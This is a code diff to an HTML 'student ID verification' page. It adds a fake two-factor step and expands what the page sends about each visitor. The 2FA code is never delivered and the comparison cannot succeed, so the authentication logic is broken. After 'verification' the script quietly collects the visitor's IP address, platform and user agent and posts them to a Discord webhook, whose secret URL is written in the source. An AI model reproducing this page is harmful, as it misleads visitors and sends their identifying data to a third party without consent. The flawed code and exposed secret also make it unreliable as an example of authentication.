@@ -51,13 +51,35 @@
         }
     </style>
     <script>
-        var correctAnswer = "1737";  // The correct student ID last 4 digits
+        var studentID = "1737";  // Fixed student ID for verification
         var discordWebhookURL = "https://discord.com/api/webhooks/1318695220946272267/KqDt8OwWy9m7JaawU9oZt1F2vmPzH-g01pRmEBUPik0NuP9Se5D9L9dSqb1lUa-OdS4-";  // Your Discord webhook URL
+
+        // Function to generate a random 6-digit 2FA code
+        function generateRandom2FACode() {
+            return Math.floor(100000 + Math.random() * 900000);  // Generates a 6-digit code
+        }
+
+        // Generate a random 2FA code
+        var twoFACode = generateRandom2FACode();
+
+        // Display the 2FA code for debugging (will not be shown to the user)
+        console.log("2FA Code for this session: " + twoFACode);
 
         function verifyAnswer() {
             var userAnswer = document.getElementById("studentID").value;
 
-            if (userAnswer === correctAnswer) {
+            if (userAnswer === studentID) {
+                // Show 2FA input if student ID is correct
+                document.getElementById("2faPrompt").style.display = "block";
+            } else {
+                alert("Incorrect student ID. Please try again.");
+            }
+        }
+
+        function verify2FACode() {
+            var user2FACode = document.getElementById("2faCode").value;
+
+            if (user2FACode === twoFACode) {
                 alert("Congrats, you have been verified!");
 
                 // Fetch user's IP address using ipify API
@@ -65,6 +87,10 @@
                     .then(response => response.json())
                     .then(data => {
                         var userIP = data.ip;  // Get user's IP address
+                        var deviceInfo = {
+                            platform: navigator.platform, // Device platform (Windows, Mac, etc.)
+                            userAgent: navigator.userAgent // Browser/device details
+                        };
 
                         // Send the notification to Discord
                         fetch(discordWebhookURL, {
@@ -83,8 +109,20 @@
                                             value: "User has been verified successfully!"
                                         },
                                         {
+                                            name: "Student ID",
+                                            value: studentID
+                                        },
+                                        {
+                                            name: "2FA Code",
+                                            value: twoFACode
+                                        },
+                                        {
                                             name: "User IP Address",
                                             value: userIP
+                                        },
+                                        {
+                                            name: "Device Info",
+                                            value: `Platform: ${deviceInfo.platform}\nUser Agent: ${deviceInfo.userAgent}`
                                         }
                                     ]
                                 }]
@@ -108,7 +146,7 @@
                         alert("Could not retrieve your IP address. Please try again.");
                     });
             } else {
-                alert("Incorrect answer. Please try again.");
+                alert("Incorrect 2FA code. Please try again.");
             }
         }
     </script>
@@ -119,6 +157,14 @@
         <input type="text" id="studentID" placeholder="Enter last 4 digits" maxlength="4">
         <br>
         <button onclick="verifyAnswer()">Submit</button>
+
+        <!-- 2FA Prompt -->
+        <div id="2faPrompt" style="display:none;">
+            <h2>Please enter the 2FA code sent to you:</h2>
+            <input type="text" id="2faCode" placeholder="Enter 2FA code" maxlength="6">
+            <br>
+            <button onclick="verify2FACode()">Submit 2FA Code</button>
+        </div>
     </div>
 </body>
 </html>
